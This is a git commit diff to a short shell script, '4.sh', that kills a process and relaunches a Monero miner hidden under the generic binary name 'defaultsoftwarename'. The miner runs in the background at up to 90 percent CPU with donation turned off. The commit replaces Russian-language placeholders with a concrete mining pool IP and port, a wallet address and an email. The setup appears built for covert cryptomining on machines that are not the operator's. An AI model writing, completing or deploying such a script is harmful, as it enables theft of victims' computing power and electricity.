9c5f2f66a8d4ee10dc477d16a0f51d0c9e784910
Acronym13 <60100405+Acronym13@users.noreply.github.com>
2020-01-20 06:09:04 -0800

    Update 4.sh

--- 4.sh
+++ 4.sh
@@ -1,3 +1,3 @@
 pkill defaultsoftwarename
 sleep 7
-defaultsoftwarename -o ВАШ ИП:ПОРТ -u ВАШ КОШЕЛЁК МОНЕРО --pass=x:ВАША ПОЧТА --rig-id=03 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=90 --av=1
+defaultsoftwarename -o 54.37.56.32:34211 -u 4ApCAne8nYfVTvBKnA5caLiMBcd8Fta9oUNhsZ9a3jSWF84pA7EhQ1CGiCRa9tw1YdBBHQCvxHmPcFiF1VEenaxY6EmVhHy --pass=x:pay2playbytheway@protonmail.com --rig-id=3 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=90 --av=1
